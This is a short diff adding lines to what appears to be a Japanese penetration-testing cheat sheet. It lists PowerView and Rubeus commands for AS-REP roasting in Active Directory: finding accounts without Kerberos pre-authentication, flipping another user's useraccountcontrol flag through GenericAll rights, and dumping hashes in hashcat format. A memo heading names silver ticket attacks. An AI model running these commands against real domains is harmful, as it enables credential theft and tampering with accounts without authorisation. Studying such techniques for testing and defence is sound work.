@@ -38,6 +38,12 @@ sudo dpkg -i python3-cryptography_41.0.7-4ubuntu0.1_amd64.deb
 wget http://launchpadlibrarian.net/715850281/python3-openssl_24.0.0-1_all.deb
 sudo dpkg -i python3-openssl_24.0.0-1_all.deb
 
+//powerView（power shellのモジュール)
+Import-Module .\PowerView.ps1 #ターゲットのPS上でpowerviewをインポート
+Get-DomainUser -UACFilter DONT_REQ_PREAUTH #ASReproastingの対象となるユーザの探索
+Set-DomainObject -Identity userName -XOR @{useraccountcontrol=4194304} -Verbose #GenericAll権限があるユーザでほかのユーザにASReproastingが効くようにする
+
+//Rubeus.exe asreproast /format:hashcatを使用して、DONT_REQ_PREAUTHフラグを持つすべてのアカウントを列挙することもできる
 
 ***メモ***
 【シルバーチケット攻撃】
